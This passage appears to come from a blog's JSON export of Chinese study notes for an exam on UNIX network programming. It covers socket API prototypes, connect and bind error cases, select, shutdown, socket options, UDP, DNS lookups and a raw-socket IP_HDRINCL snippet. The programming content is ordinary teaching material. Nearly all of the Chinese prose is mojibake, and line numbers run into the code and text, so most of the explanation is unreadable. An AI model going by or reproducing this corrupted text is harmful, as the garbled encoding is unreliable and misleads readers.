size_t nbytes); Returns: 0 if equal, nonzero if unequal mem 1234567#include &lt;string.h&gt;void *memset(void *dest, int c, size_t len);void *memcpy(void *dest, const void *src, size_t nbytes);int memcmp(const void *ptr1, const void *ptr2, size_t nbytes); Returns: 0 if equal, &lt;0 or &gt;0 if unequal (see text) åœ°å€è½¬æ¢å‡½æ•°IPV4 12345678910#include &lt;arpa/inet.h&gt;// converts the C character string pointed to by strptr into// its 32-bit binary network byte ordered value, // which is stored through the pointer addrptr int inet_aton(const char *strptr, struct in_addr *addrptr); Returns: 1 if string was valid, 0 on errorin_addr_t inet_addr(const char *strptr); Returns: 32-bit binary network byte ordered IPv4 address; INADDR_NONE if errorchar *inet_ntoa(struct in_addr inaddr); Returns: pointer to dotted-decimal string inet_aton å°†å­—ç¬¦ä¸² strptr è½¬æ¢ä¸º 32æ¯”ç‰¹äºŒè¿›åˆ¶ç½‘ç»œå­—èŠ‚åºåœ°å€ addrptr inet_addr ä½œç”¨åŒä¸Šï¼Œå‡ºé”™è¿”å› INADDR_NONE255.255.255.255,æ‰€ä»¥ä¸èƒ½å¤„ç†è¯¥åœ°å€ï¼ˆè¢«åºŸå¼ƒï¼‰ inet_ntoa 32bitç½‘ç»œå­—èŠ‚åºåˆ°ç‚¹åˆ†åè¿›åˆ¶IPV4å­—ç¬¦ä¸²ï¼Œå‚¨å­˜åœ¨é™æ€å†…å­˜ï¼Œä¸å¯é‡å…¥ IPV4/6 123456#include &lt;arpa/inet.h&gt;int inet_pton(int family, const char *strptr, void *addrptr); Returns: 1 if OK, 0 if input not a valid presentation format, âˆ’1 on errorconst char *inet_ntop(int family, const void *addrptr, char *strptr, size_t len); Returns: pointer to result if OK, NULL on error p - presentation , n - numeric family : AF_INET / AF_INET6 ä¸æ”¯æŒ errno= EAFNOSUPPORT inet_pton : å­—ç¬¦ä¸² strptr è½¬æ¢ä¸º addrptr äºŒè¿›åˆ¶åœ°å€ç»“æœ inet_ntop : ç›¸åï¼Œlen ä½ strptr å¤§å°ï¼Œé˜²æ­¢æº¢å‡º - lenå¤ªå°ï¼Œè¿”å›ç©ºæŒ‡é’ˆ errno=ENOSPC è¯»å†™å‡½æ•°12345#include &quot;unp.h&quot;ssize_t readn(int filedes, void *buff, size_t nbytes);ssize_t writen(int filedes, const void *buff, size_t nbytes);ssize_t readline(int filedes, void *buff, size_t maxlen); All return: number of bytes read or written, âˆ’1 on error readline æ¯æ¬¡è¯»ä¸€ä¸ªå­—ç¬¦ï¼Œæç«¯åœ°æ…¢ Chapter 4åŸºæœ¬ TCP å¥—æ¥å­—ç¼–ç¨‹ Socket å‡½æ•°123#include &lt;sys/socket.h&gt;int socket(int family, int type, int protocol); Returns: non-negative descriptor if OK, âˆ’1 on error AF_INET AF_INET6 AF_LOCAL AF_ROUTE AF_KEY SOCK_STREAM TCP|SCTP TCP|SCTP YES SOCK_DGRAM UDP UDP YES SOCK_SEQPACKET SCTP SCTP YES SOCK_RAW IPV4 IPV6 YES YES Connect å‡½æ•°123#include &lt;sys/socket.h&gt;int connect(int sockfd, const struct sockaddr *servaddr, socklen_t addrlen); Returns: 0 if OK, âˆ’1 on error client ç”¨äºä¸ server è¿æ¥ï¼Œå†…æ ¸ä¼šè‡ªå·±é€‰æ‹©ä¸´æ—¶ç«¯å£ 75 s æ— å“åº”åè¿”å› ETIMEDOUT è‹¥ç›¸åº” RST åˆ™é©¬ä¸Šè¿”å› ECONNREFUSED - æŒ‡å®šç«¯å£æ²¡æœ‰ç­‰å¾…è¿æ¥ ç›®çš„ä¸å¯è¾¾ï¼Œè¿”å› EHOSTUNREACH, ENETUNREACH é”™è¯¯ å¦‚æœç»™ä¸å­˜åœ¨çš„æœºå™¨å‘é€ï¼Œå› ä¸ºæ²¡æœ‰ ARP reply , ETIMEOUT 1connect error: Connection timed out å¦‚æœç»™æœªè¿è¡Œ server çš„æœºå™¨å‘é€ï¼Œæ”¶åˆ° RST ï¼Œ ECONNREFUSED 1connect error: Connection refused ç»™ä¸å¯è¾¾å‘é€ï¼Œ æ”¶åˆ° ICMP ä¸å¯è¾¾é”™è¯¯ï¼Œ EHOSTUNREACH 1connect error: No route to host æ¯æ¬¡ connect å¤±è´¥åï¼Œéƒ½éœ€è¦å…³é—­ sockfd é‡æ–°è°ƒç”¨ socket å‡½æ•° bind å‡½æ•°123#include &lt;sys/socket.h&gt;int bind(int sockfd, const struct sockaddr *myaddr, socklen_t addrlen); Returns: 0 if OK, âˆ’1 on error 32b ipv4 / 128b ipv6 + 16b TCP/UDP port number Servers ä¼šåœ¨å¯åŠ¨æ—¶è°ƒç”¨ bind ç«¯å£ï¼ˆç¨‹åºå®šä¹‰ï¼‰ ï¼Œè‹¥æ²¡æœ‰åˆ™å½“è°ƒç”¨ connect æˆ– listen æ—¶ï¼Œå†…æ ¸ä¼šé€‰æ‹©ä¸€ä¸ªä¸´æ—¶ç«¯å£ æˆ– æ ¹æ® SYN çš„ç›®çš„åœ°å€ Client é€šå¸¸ä¸ä¼šbind è€Œæ˜¯ connect æ—¶ç”±å†…æ ¸æ ¹æ®è·¯å¾„é€‰æ‹© IPåœ°å€wildcard é€šé…ç¬¦ ipv4 : INADDR_ANY 0.0.0.0ï¼Œå†…æ ¸ç­‰åˆ°TCPè¿æ¥ï¼ŒUDPæŠ¥æ–‡å‘é€åé€‰æ‹©ipåœ°å€ ipv6 : in6addr_any ç”±ç³»ç»Ÿé¢„å…ˆåˆ†é…å¹¶ç½®ä¸ºIN6ADDR_ANY_INIT RPC ä¾‹å¤–ï¼Œä¼šé€šè¿‡ ç«¯å£æ˜ å°„å™¨æ³¨å†Œ é”™è¯¯EADDRINUSE ï¼š Address already in use åœ°å€å·²ä½¿ç”¨ listen å‡½æ•°Server ï¼š convert unconnected socket into a passive socket 123#include &lt;sys/socket.h&gt;int listen(int sockfd, int backlog); Returns: 0 if OK, âˆ’1 on error backlog : å†…æ ¸é˜Ÿåˆ—ä¸­æ’é˜Ÿçš„æœ€å¤§è¿æ¥æ•° è°ƒç”¨æ—¶é—´ï¼š socket bind åï¼Œ accept å‰ ä¸º listening socket ä¿æŒä¸¤ä¸ªé˜Ÿåˆ— incomplete connection queue æœªå®Œæˆè¿æ¥é˜Ÿåˆ— ï¼Œ æœªå®Œæˆæ¡æ‰‹ï¼ŒSYN_RCVD æ€ completed connection queue å·²å®Œæˆè¿æ¥é˜Ÿåˆ— ï¼Œ å®Œæˆæ¡æ‰‹ ï¼Œ ESTABLISHED æ€ ä¸¤é˜Ÿä¹‹å’Œä¸è¶…è¿‡ backlog accept å‡½æ•° è¿”å›å·²å®Œæˆè¿æ¥é˜Ÿåˆ—é˜Ÿå¤´ï¼Œå¦‚æœä¸ºç©ºï¼Œè¿›ç¨‹ç¡çœ  123#include &lt;sys/socket.h&gt;int accept(int sockfd, struct sockaddr *cliaddr, socklen_t *addrlen); Returns: non-negative descriptor if OK, âˆ’1 on error sockfd : listening socket ç›‘å¬ return : connected socket å·²è¿æ¥ cliaddr &amp; addrlen ï¼šå¯¹ç«¯çš„åœ°å€å’Œé•¿åº¦ ä¸€å¯¹å¤šçš„å…³ç³»ï¼Œç›‘å¬socket ä¿æŒæ‰“å¼€ï¼Œè¿æ¥socketå®Œæˆå¯¹ä¸€ä¸ªå®¢æˆ·çš„æœåŠ¡å°±å…³é—­ bind é”™è¯¯ éè¶…çº§ç”¨æˆ·ï¼š 1bind error: Permission denied fork å’Œ exec å‡½æ•° fork æ˜¯å”¯ä¸€ç”Ÿæˆæ–°è¿›ç¨‹çš„å‡½æ•° 123#include &lt;unistd.h&gt;pid_t fork(void); Returns: 0 in child, process ID of child in parent, âˆ’1 on error å¹¶å‘æœåŠ¡å™¨çˆ¶è¿›ç¨‹ listenfd ç›‘å¬ ï¼Œ å­è¿›ç¨‹ connfd è´Ÿè´£æ¥æ”¶æ•°æ®å’Œå®é™… æ“ä½œ close å‡½æ•°123#include &lt;unistd.h&gt;int close(int sockfd); Returns: 0 if OK, âˆ’1 on error ä¸ºäº†æ–¹ä¾¿å¤šä¸ªè¿›ç¨‹ä½¿ç”¨å¥—æ¥å­—ï¼Œå®ƒæ˜¯å¼•ç”¨è®¡æ•°çš„ã€‚ å†…æ ¸ ä¼š å‘å®Œæ‰€æœ‰ç­‰å¾…å‘é€çš„æ•°æ®ï¼Œç„¶åTCPè¿æ¥ç»ˆæ­¢è¿‡ç¨‹ å¦‚æœåªæƒ³å‘é€FINï¼Œæ”¹ç”¨shutdownå‡½æ•° åœ°å€ å‡½æ•°1234#include &lt;sys/socket.h&gt;int getsockname(int sockfd, struct sockaddr *localaddr, socklen_t *addrlen);int getpeername(int sockfd, struct sockaddr *peeraddr, socklen_t *addrlen); Both return: 0 if OK, âˆ’1 on error sock æœ¬åœ°ï¼Œpeer è¿æ¥å¯¹ç«¯ é‡ç‚¹åŸºæœ¬éƒ½è¦æ±‚æŒæ¡ ã€ 5.13ä¸è¦æ±‚æŒæ¡ã€ 6.9ï¼Œ6.20 ä¸è¦æ±‚æŒæ¡ Chapter 5TCP Echo ServerPort : 5000 - 49152 Normal Startupserver é˜»å¡åœ¨ accept ï¼ˆè¿˜æœªå¯åŠ¨ç”¨æˆ·ï¼‰ client é˜»å¡åœ¨ fgets è°ƒç”¨ è¿æ¥ æœåŠ¡å™¨é˜»å¡åœ¨ read ï¼Œçˆ¶è¿›ç¨‹é˜»å¡åœ¨ accept æ­¤æ—¶ ä¸‰ä¸ªè¿›ç¨‹ STAT éƒ½æ˜¯ S- sleeping - ï¼ˆå·²é˜»å¡ï¼‰ WCHAN çˆ¶è¿›ç¨‹ wait_for_connect , server tcp_data_wait , client - read_chan Normal TerminationClient ï¼š EOF å­—ç¬¦ï¼ˆControl+D) ç»ˆæ­¢æœåŠ¡å™¨ å®¢æˆ·ç«¯è¿›å…¥ TIME_WAIT çŠ¶æ€ ä¿¡å·å¤„ç†SIGKILL &amp; SIGSTOP ä¸èƒ½è¢«æ•è· ä¿¡å·å¤„ç†å‡½æ•°æ˜¯ä¸€ä¸ªä»…æœ‰ä¸€ä¸ªæ•´æ•°å‚æ•°ä¸”ä¸è¿”å›å€¼çš„å‡½æ•° wait &amp; waitpid1234#include &lt;sys/wait.h&gt;pid_t wait(int *statloc);pid_t waitpid(pid_t pid, int *statloc, int options); Both return: process ID if OK, 0 or âˆ’1 on error å¤„ç†å·²ç»ˆæ­¢çš„å­è¿›ç¨‹ è¿”å›å€¼ï¼š å·²ç»ˆæ­¢å­è¿›ç¨‹çš„è¿›ç¨‹IDå·ï¼Œé€šè¿‡statlocæŒ‡é’ˆè¿”å›çš„å­è¿›ç¨‹ç»ˆæ­¢çŠ¶æ€ï¼ˆä¸€ä¸ªæ•´æ•°ï¼‰ å¯¹äºåŒç§ç±»å‹çš„ä¿¡å·ï¼Œä¸»æœºåªä¼šæ‰§è¡Œä¸€æ¬¡ä¿¡å·å¤„ç†å‡½æ•° acceptè¿”å›å‰è¿æ¥ä¸­æ­¢connect åï¼Œ accept å‰ï¼Œå®¢æˆ·ç«¯å‘é€ RST æŠ¥æ–‡ POSIX ï¼š ECONNABORTED - software caused connection abort æœåŠ¡å™¨è¿›ç¨‹ç»ˆæ­¢æœåŠ¡å™¨è¿›ç¨‹å´©æºƒåï¼Œå¦‚æœclientä¸æ“ä½œï¼Œä¼šé˜»å¡åœ¨fgetsï¼Œè¾“å…¥å­—ç¬¦åï¼Œreadlineå› æ¥æ”¶åˆ°FINè¿”å›0ï¼ˆEOFï¼‰ï¼Œclient è¿”å› ï¼š str_cli: server terminated prematurely - ç¨‹åºå®šä¹‰çš„å¹¶ç»“æŸ å¦‚æœå…ˆæ”¶åˆ°äº†RSTï¼Œä¼šè¿”å›ECONNRESET -connection reset by peer RST ä¼šå› ä¸ºå¹¶æ²¡æœ‰ä¸è¯¥å®¢æˆ·ç«¯è¿æ¥ä½†æ˜¯æ¥æ”¶åˆ°è¯¥å®¢æˆ·ç«¯å‘é€çš„å†…å®¹è€Œè¢«æœåŠ¡å™¨å‘é€ æœåŠ¡å™¨ä¸»æœºå´©æºƒåŒä¸Šé¢ä¸åŒçš„æ˜¯ï¼ŒæœåŠ¡å™¨å¹¶ä¸ä¼šæœ‰ä»»ä½•ååº”ï¼Œä¼šæœ‰ä»¥ä¸‹ä¸¤ç§æƒ…å†µï¼š ä¸€ç›´æ²¡æœ‰å“åº” ETIMEOUT ä¸­é—´è·¯ç”±å™¨åˆ¤æ–­ä¸å¯è¾¾ï¼Œå“åº”ä¸€ä¸ª destination unreachable çš„ ICMPï¼Œè¿”å›çš„é”™è¯¯æ˜¯EHOSTUNREACHæˆ– ENETUNREACH æœåŠ¡å™¨ä¸»æœºå´©æºƒåé‡å¯å½“æœåŠ¡å™¨ä¸»æœºå´©æºƒåé‡å¯æ—¶ï¼Œå®ƒçš„TCPä¸¢å¤±äº†å´©æºƒå‰çš„æ‰€æœ‰è¿æ¥ä¿¡æ¯ï¼Œå› æ­¤æœåŠ¡å™¨TCPå¯¹äºæ‰€æ”¶åˆ°çš„æ¥è‡ªå®¢æˆ·çš„æ•°æ®åˆ†èŠ‚å“åº”ä»¥ ä¸€ä¸ªRST æ•°æ®æ ¼å¼æœåŠ¡å™¨è¯»å…¥æ¢è¡Œç¬¦ï¼Œæ‰€æœç´¢çš„åªæ˜¯æ¢è¡Œç¬¦ äºŒè¿›åˆ¶ ï¼š sscanf è½¬æ¢åˆ° ç»“æ„ä½“ binary ï¼Œå‘é€åï¼Œå¯¹æ–¹ä¹Ÿç”¨åŒæ ·çš„ç»“æ„ä½“æ¥æ”¶ã€‚ å¤§å°ç«¯ä¸åŒ ï¼Œ åŒæ ·intå‹é•¿åº¦ä¸åŒï¼Œç»“æ„ä½“çš„æ‰“åŒ…æ–¹å¼ä¸åŒ éƒ½ä¼šå¯¼è‡´è´Ÿæ•°ä¸è¡Œï¼Œ è§£å†³æ–¹æ³•ï¼š å‘é€ string ï¼Œ ç”¨ XDRï¼ˆexternal data representation) å‘é€ Chapter 6I/O Modelåˆ†ä¸ºä¸¤ä¸ªéƒ¨åˆ† ï¼š ç­‰å¾…å¯¹ç«¯å‘é€æ•°æ® ï¼Œå°†æ•°æ®ä»å†…æ ¸æ‹·è´åˆ°ç”¨æˆ· blocking ï¼š è°ƒç”¨æ¥æ”¶å‡½æ•°åå°±ä¸€ç›´ç­‰åˆ°ä¸¤æ­¥éƒ½å®Œæˆåœ¨è¿”å› Nonblocking ï¼šç¬¬ä¸€é˜¶æ®µä¸æ–­å¾ªç¯callï¼ŒçŸ¥é“æ”¶åˆ°å®Œæ•´åŒ… Multiplexingï¼šç¬¬ä¸€æ­¥è°ƒç”¨selectï¼Œç›´åˆ°è¿”å›readableï¼Œç„¶åè°ƒç”¨recvfromå®Œæˆç¬¬äºŒæ­¥ å¥½å¤„ï¼š å¯ä»¥ç­‰å¾…å¤šä¸ªæè¿°ç¬¦ Signal-Driven: è°ƒç”¨åç«‹å³è¿”å›ï¼Œsignal handler ä¼šåœ¨ data å‡†å¤‡å¥½åå‘å‡ºä¿¡å·ï¼Œè°ƒç”¨recvfromå®Œæˆç¬¬äºŒæ­¥ Asynchronousï¼šå‘ŠçŸ¥å†…æ ¸å¯åŠ¨æŸä¸ªæ“ä½œï¼Œ å¹¶è®©å†…æ ¸åœ¨ä¸¤æ­¥æ“ä½œ å®Œæˆåé€šçŸ¥æˆ‘ä»¬ select å‡½æ•°å‘Šè¯‰å†…æ ¸ç­‰å¾…å¤šä¸ªäº‹ä»¶ï¼Œæœ‰æ—¶é—´å‘ç”Ÿæˆ–Timeoutåå”¤é†’ä»– 12345#include &lt;sys/select.h&gt;#include &lt;sys/time.h&gt;int select(int maxfdp1, fd_set *readset, fd_set *writeset, fd_set *exceptset, const struct timeval *timeout); Returns: positive count of ready descriptors, 0 on timeout, âˆ’1 on error maxfdp1ï¼Œå¾…æµ‹è¯•çš„æœ€å¤§æè¿°ç¬¦å€¼+1 set ï¼š å‘Šè¯‰å†…æ ¸ what descriptors we are interested in ï¼Œä¸å…³å¿ƒè®¾ä¸ºç©ºï¼Œä¸‰ä¸ªå‚æ•°éƒ½æ˜¯ value-result ç±»å‹çš„ï¼Œè°ƒç”¨æ—¶ä¸ºå…³å¿ƒçš„æè¿°ç¬¦çš„å€¼ï¼Œè¿”å›æ—¶æŒ‡ç¤ºå“ªäº›æè¿°ç¬¦å·²å°±ç»ª readset : Any of the descriptors in the readset are ready for reading writeset: Any of the descriptors in the writeset are ready for reading exceptset : Any of the descriptors in the exceptset have an exception condition pending timeout : how long to wait - ä¿¡å·ä¸­æ–­ - ä¸å‡† è®¾ç½®ä¸ºç©º ï¼šæ°¸è¿œç­‰å¾… å€¼ï¼šå›ºå®šæ—¶é—´ 0ï¼šæ ¹æœ¬ä¸ç­‰å¾…- è½®è¯¢ï¼ˆpollingï¼‰ Returns ï¼šå°±ç»ªçš„æ•°ç›®ï¼Œtimeout=0ï¼Œerror=-1 è¿™æ˜¯ç³»ç»Ÿå‡½æ•°ï¼Œdescriptor å’Œ socket æ— å…³ï¼Œsocket å¯ä»¥ select ä»»æ„ descriptor é”™è¯¯å¤„ç† - ä¸è€ƒ fd_set æ•°æ®ç»“æ„æ¯ä¸€ä½ä»£è¡¨ä¸€ä¸ªæè¿°ç¬¦ï¼Œæ¯ä¸€bitä¸º 1234void FD_ZERO(fd_set *fdset); /* clear all bits in fdset */void FD_SET(int fd, fd_set *fdset); /* turn on the bit for fd in fdset */void FD_CLR(int fd, fd_set *fdset); /* turn off the bit for fd in fdset */int FD_ISSET(int fd, fd_set *fdset); /* is the bit for fd on in fdset ? */ åˆ©ç”¨ FD_ZERO è¿›è¡Œåˆå§‹åŒ–ååˆ†é‡è¦,å› ä¸ºæ˜¯ value-resultå€¼ä¼šå˜åŒ– FD_SETSIZE : 1024 è¯» ready çš„æ¡ä»¶ æ”¶åˆ°çš„æ•°æ®é«˜äº low-water ä½æ°´ä½äº† è¿æ¥å…³é—­äº†ï¼Œread è¿”å› 0 ï¼ˆEOFï¼‰ æ˜¯ç›‘å¬å¥—æ¥å­—ï¼Œä¸”æœ‰å·²å®Œæˆçš„è¿æ¥ ï¼Ÿ å¥—æ¥å­—æœ‰é”™è¯¯å¾…å¤„ç†ï¼Œè¿”å› -1 ï¼Œ errno è®¾ç½®æˆç¡®åˆ‡çš„é”™è¯¯æ¡ä»¶ å†™ ready çš„æ¡ä»¶ å·²è¿æ¥ï¼ˆudpä¸éœ€è¦ï¼‰ï¼Œå¯å†™ç©ºé—´è¶…è¿‡ low-water å†™åŠè¾¹å…³é—­äº† ï¼ˆæœ‰æœªå®Œæˆå‘é€çš„æ•°æ®ï¼Œè¦å‘é€å‡ºå»ï¼‰ non-blocking connect å»ºç«‹äº†è¿æ¥æˆ–å¤±è´¥äº† å¥—æ¥å­—æœ‰é”™è¯¯å¾…å¤„ç†ï¼Œè¿”å› -1 ï¼Œ errno è®¾ç½®æˆç¡®åˆ‡çš„é”™è¯¯æ¡ä»¶ exceptiong readyå¦‚æœä¸€ä¸ªå¥—æ¥å­—å­˜åœ¨å¸¦å¤–æ•°æ®æˆ–è€…ä»å¤„äºå¸¦å¤–æ ‡è®°ï¼Œé‚£ä¹ˆå®ƒæœ‰å¼‚å¸¸æ¡ä»¶å¾…å¤„ç† str_clié˜»å¡åœ¨ select ï¼Œå°†åŸæœ¬çš„å¾…å‰åé¡ºåºçš„é˜»å¡ï¼Œå˜æˆåŒæ—¶çš„é˜»å¡ shutdownç»™æœåŠ¡å™¨å‘é€ä¸€ä¸ªFINï¼Œå‘Šè¯‰å®ƒæˆ‘ä»¬å·²ç»å®Œæˆäº†æ•°æ®å‘é€ï¼Œä½†æ˜¯ ä»ç„¶ä¿æŒå¥—æ¥å­—æè¿°ç¬¦æ‰“å¼€ä»¥ä¾¿è¯»å– 123#include &lt;sys/socket.h&gt;int shutdown(int sockfd, int howto); Returns: 0 if OK, âˆ’1 on error ä¸åŠ¨å¼•ç”¨è®¡æ•°å°±æ¿€å‘TCPçš„æ­£å¸¸è¿æ¥ç»ˆæ­¢åºåˆ— closeç»ˆæ­¢è¯»å’Œå†™ä¸¤ä¸ªæ–¹å‘çš„æ•°æ®ä¼ é€ï¼Œshutdown è¿˜å¯ä»¥ç»§ç»­è¯» ä¸‰ç§å¯é€‰é¡¹ SHUT_RD ï¼šå…³é—­è¿æ¥çš„è¯»è¿™ä¸€åŠ SHUT_WRï¼šå…³é—­è¿æ¥çš„å†™è¿™ä¸€åŠ SHUT_RDWRï¼šè¿æ¥çš„è¯»åŠéƒ¨å’Œå†™åŠéƒ¨éƒ½å…³é—­ str_cli pipelineç‰ˆåŠ å…¥ shutdown ï¼Œæ¨¡æ‹Ÿå…ˆè¿ç»­å‘é€æ•°æ®ï¼Œå…³é—­å†™åŠéƒ¨ï¼Œç„¶åå†è¿ç»­æ¥æ”¶è¿”å›æ•°æ®çš„pipelineæ“ä½œ TCP echo ç¨‹åº- select ç‰ˆclient æ•°ç»„å­˜å‚¨å·²è¿æ¥acceptæè¿°ç¬¦çš„å€¼ çœå»äº† fork æ–°è¿›ç¨‹çš„å¼€é”€ rset æ•°ç»„ä¿å­˜ 0-stdinï¼Œ1-stdoutï¼Œ2-stderr ï¼Œ3â€“ éƒ½æ˜¯å·²è¿æ¥æè¿°ç¬¦ å®¢æˆ·å‘é€ FINï¼Œ4å˜ä¸ºå¯è¯»readå°†è¿”å›0ã€‚å…³é—­è¯¥å¥—æ¥å­—å¹¶æŠŠclient[0]çš„å€¼ç½®ä¸º-1ï¼ŒæŠŠæè¿°ç¬¦é›†ä¸­æè¿°ç¬¦4çš„ä½è®¾ç½®ä¸º0ã€‚æ³¨æ„ï¼Œmaxfdçš„å€¼æ²¡æœ‰æ”¹å˜ã€‚ Chapter 7_sockopt å‡½æ•°12345#include &lt;sys/socket.h&gt;int getsockopt(int sockfd, int level, int optname, void *optval, socklen_t *optlen);int setsockopt(int sockfd, int level, int optname, const void *optval,socklen_t optlen); Both return: 0 if OK, âˆ’1 on error sockfd ï¼š æ‰“å¼€çš„å¥—æ¥å­—æè¿°ç¬¦ level ï¼šæŒ‡ä»£ç³»ç»Ÿä¸­è§£é‡Šè¯¥é€‰é¡¹çš„ä»£ç  optval ï¼šå­˜å‚¨optionçš„æ•°æ®ç»“æ„ - æ˜¯æ ‡å¿—0ä¸ºä¸å¯ç”¨ï¼Œå€¼ä¸ºå¯ç”¨ optlen ï¼šé•¿åº¦ - value-result sockopt :æŒæ¡ 7.2 åŸç† - SO_LINGER / SO_KEEPALIVE / SO_DONTROUTE SO_KEEPALIVEä¿æ´» SO_LINGER ï¼Ÿå…³é—­ close æ—¶æ˜¯å¦ä¸¢å¼ƒä¿ç•™åœ¨å¥—æ¥å­—å‘é€ç¼“å†²åŒºä¸­çš„ä»»ä½•æ•°æ®ï¼Œ è®¾ç½®æ­£çš„å»¶æ»æ—¶é—´ SO_DONTROUTEæ˜¯å¦ç»•è¿‡ä¸‹å±‚åè®®çš„è·¯ç”±æœºåˆ¶ IP : IP_HDRINCL / IP_TTL IP_HDRINCLè®¾ç½®äº†å°±éœ€è¦è‡ªå·±æ„å»ºIPå¤´ IP_TTL è®¾ç½®å’Œè·å–ç³»ç»Ÿç”¨åœ¨ä»æŸä¸ªç»™å®šå¥—æ¥å­—çš„é»˜è®¤TTLå€¼ TCP : TCP_MAXSEGå…è®¸æˆ‘ä»¬è·å–æˆ–è®¾ç½®TCPè¿æ¥çš„æœ€å¤§åˆ†èŠ‚å¤§å° SYNä¸­é€šå‘Šçš„MSS Chapter 8â€‹ 8.1 å›¾ ï¼Œ å¹¶å‘ç¨‹åºè®¾è®¡ - é‡ç‚¹æ³¨æ„åŒºåˆ« sendto() recvfrom() 123456#include &lt;sys/socket.h&gt;ssize_t recvfrom(int sockfd, void *buff, size_t nbytes, int flags, struct sockaddr *from, socklen_t *addrlen);ssize_t sendto(int sockfd, const void *buff, size_t nbytes, int flags, const struct sockaddr *to, socklen_t addrlen); Both return: number of bytes read or written if OK, âˆ’1 on error echo ç¨‹åº 1Socket(AF_INET, SOCK_DGRAM, 0); æœåŠ¡å™¨è¿›ç¨‹æœªè¿è¡Œè¿”å› ICMP å¼‚æ­¥é”™è¯¯ sendtoæˆåŠŸè¿”å›ä»…è¡¨ç¤ºæ¥å£è¾“å‡ºé˜Ÿåˆ—ä¸­æœ‰å­˜æ”¾æ•°æ®æŠ¥çš„ç©ºé—´ ä»…åœ¨è¿›ç¨‹å·²å°†å…¶UDPå¥—æ¥å­—è¿æ¥åˆ°ä¸€ä¸ªå¯¹ç«¯åï¼Œè¿™äº›å¼‚æ­¥é”™è¯¯æ‰è¿”å›ç»™è¿›ç¨‹ connect ä¸éœ€è¦å†æŒ‡å®š ç›®çš„IPå’Œç«¯å£å· ä¸ç”¨recvfrom ç”¨ read å°±è¡Œ è¿”å›å¼‚æ­¥é”™è¯¯ Chapter 11â€‹ ç®€å•å‰é¢éƒ¨åˆ† DNS æ“ä½œ 11.3ã€11.4ã€11.5 ä½¿ç”¨ UDP æŸ¥è¯¢ï¼Œå¦‚æœç­”æ¡ˆå¤ªé•¿ï¼Œè¶…å‡ºäº†UDPæ‰¿è½½èƒ½åŠ›ï¼Œæ¢æˆTCP gethostbyname123#include &lt;netdb.h&gt;struct hostent *gethostbyname(const char *hostname); Returns: non-null pointer if OK, NULL on error with h_errno set åªèƒ½è¿”å›ipv4ï¼Œgetaddrinfo èƒ½å¤Ÿå¤„ç†4å’Œ6 gethostbyaddr123#include &lt;netdb.h&gt;struct hostent *gethostbyaddr(const char *addr, socklen_t len, int family); Returns: non-null pointer if OK, NULL on error with h_errno set 1234567#include &lt;netdb.h&gt;struct servent *getservbyname(const char *servname, const char *protoname);Returns: non-null pointer if OK, NULL on erro#include &lt;netdb.h&gt;struct servent *getservbyport(int port, const char *protoname);Returns: non-null pointer if OK, NULL on error Part 3 Advanced Sockets12ï¼Œ13ï¼Œ14ï¼Œ15 ï¼Œ17ï¼Œ18.5,20,21,22,23,24ï¼Œ30ï¼Œ31ä¸è€ƒ Daemon Process äº†è§£ä¸€ä¸‹ 19 Introduction ç‰¹æƒ SA ï¼Œ SADB 25 æŒæ¡ï¼Œç»“åˆç¬¬ 5 ç« çœ‹ 26 æŒæ¡ åŸºæœ¬æ¦‚å¿µï¼Œçº¿ç¨‹å’Œè¿›ç¨‹åŒºåˆ« 27 ç»“åˆå‰é¢çš„ Options ä¸€èµ·çœ‹ï¼Œç®€å•çœ‹çœ‹ã€‚ 28 é‡ç‚¹æŒæ¡ è¯»å†™ICMPï¼Œè¯»å†™éå†…æ ¸å¤„ç†çš„åè®®æ®µçš„æ•°æ®æŠ¥ï¼Œæ„å»ºipé¦–éƒ¨ 123456sockfd = socket(AF_INET, SOCK_RAW, protocol)// ä¾‹ ï¼š protocol IPPROTO_ICMP// å¼€å¯ IP_HDRINCLconst int on = 1;if (setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &amp;on, sizeof(on)) &lt; 0)// å‡ºé”™å¤„ç† 29 æŒæ¡ åŸºæœ¬æ¦‚å¿µï¼Œå¦‚ä½•æŠ“åŒ… libpcap å…¬å¼€åˆ†ç»„æ•è·å‡½æ•°åº“ A.3 C.1 netstat tcpdump ç®€ç­”é¢˜ï¼ˆè§£é‡Šåè¯ï¼‰ ï¼Œ ç¼–ç¨‹é¢˜ï¼ˆè¡¥å……å°çš„ç‰‡æ®µï¼‰ä¸Šæœº+ä¸Šè¯¾ ï¼Œ å®éªŒåˆ†æé¢˜ï¼ˆåˆ†æå®éªŒçš„ç»“æœï¼‰ä¾‹å¦‚ï¼š æœåŠ¡ç«¯æ²¡èµ·æ¥ æŠ¥ä»€ä¹ˆé”™è¯¯ æœ€å¼€å§‹ é‚£ä¸ª å¸¦å‡½æ•°çš„å‡½æ•° é—®é¢˜P180ï¼ŒP165ï¼ŒLINGER çš„æ„æ€æ˜¯ä»€ä¹ˆ ioctl å®ç° sockopt è¿›è¡Œè¯»å†™æ“ä½œ - äº†è§£åŠŸèƒ½ å‡½æ•°åŸå‹ ï¼š åå­— + å‚æ•° ping ï¼Œ recvmsg å¦‚æœè¢«ä¸­æ–­ EINTRï¼Œcontinue é‡æ–°æ‰§è¡Œï¼Œå‡½æ•°é‡å¯ 5.10 wait / waitpid è¦æ±‚ server ï¼Œ server host æƒ…å†µ raw socket é€‚ç”¨äºä»€ä¹ˆæƒ…å†µ routing ã€key 29 introduction ä¿¡å·å¤„ç†å‡½æ•° 5 ç«  signal handler signal driven ä¸è¦æ±‚ tcpå‡½æ•°çš„é¡ºåºå›¾","link":"","tags":[{"name":"UNIX","slug":"UNIX","permalink":"https://dingiso.github.io/tags/UNIX/"},{"name":"network","slug":"network","permalink":"https://dingiso.github.io/tags/network/"}]},{"title":"å¦‚ä½•åˆ¤æ–­ç»“æ„åŒ–ç¨‹åº","date":"2021-03-11T07:52:19.000Z","path":"2021/03/11/å¦‚ä½•åˆ¤æ–­ç»“æ„åŒ–ç¨‹åº/","text":"æœ¬æ–‡æ˜¯å¸Œæœ›ä½¿ç”¨ ä¸€ä¸ªå®šä¹‰ï¼Œä¸€ä¸ªæ–¹æ³•ï¼Œå¯¹ç»“æ„åŒ–ç¨‹åºçš„å®šä¹‰è¿›è¡Œç»†åŒ– ä¸€ä¸ªå®šä¹‰ï¼š æ¯ä¸ªç¨‹åºå•å…ƒåªæœ‰ä¸€ä¸ªå…¥å£å’Œä¸€ä¸ªå‡ºå£ï¼Œä½†æ˜¯åˆ†æ”¯ç»“æ„ä¾‹å¤– 